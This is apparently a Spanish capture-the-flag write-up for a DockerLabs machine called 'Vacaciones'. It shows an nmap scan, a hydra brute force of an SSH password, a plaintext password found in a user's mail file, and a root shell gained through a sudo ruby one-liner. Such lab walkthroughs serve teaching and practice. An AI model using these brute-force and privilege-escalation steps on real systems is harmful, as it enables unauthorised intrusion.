# Vacaciones
https://dockerlabs.es

*25/5/2024*


## ENUMERACION

```
└─$ nmap -p- --open --min-rate 5000 -sCV 172.17.0.2

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 41:16:eb:54:64:34:d1:69:ee:dc:d9:21:9c:72:a5:c1 (RSA)
|   256 f0:c4:2b:02:50:3a:49:a7:a2:34:b8:09:61:fd:2c:6d (ECDSA)
|_  256 df:e9:46:31:9a:ef:0d:81:31:1f:77:e4:29:f5:c9:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


## ANALISIS DE VULNERABILIDADES

![image](https://github.com/M1queaa/DOCKERLABS/assets/108646257/9456a45b-d013-4dd2-b409-68a0d2d37eab)

## EXPLOTACION

```
└─$ hydra -l camilo -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-25 19:49:13
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: camilo   password: password1
1 of 1 target successfully completed, 1 valid password found

```

```
└─$ ssh camilo@172.17.0.2
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is SHA256:52z4CT20OpL7G8YfPhcdERem6Sq+z8868LngvNGXRlA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
camilo@172.17.0.2's password: 
$ whoami
camilo
```


## POST-EXPLOTACION

El usuario Camilo no tiene privilegios SUDO ni SUID


```
$ find mail
mail
mail/camilo
mail/camilo/correo.txt
```
Encontramos el correo del que hablaban que estaba en la pagina web


```
$ cat correo.txt
Hola Camilo,

Me voy de vacaciones y no he terminado el trabajo que me dio el jefe. Por si acaso lo pide, aquí tienes la contraseña: 2k84dicb
```
Encontramos la contraseña de Juan en el correo


```
└─$ ssh juan@172.17.0.2
juan@172.17.0.2's password: 
$ whoami
juan
$ sudo -l
Matching Defaults entries for juan on 3da0376627db:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sb

User juan may run the following commands on 3da0376627db:
    (ALL) NOPASSWD: /usr/bin/ruby
$ sudo ruby -e 'exec "/bin/sh"'
# whoami
root
```
Nos conectamos por ssh  y escalamos privilegios mediante el sudo de ruby
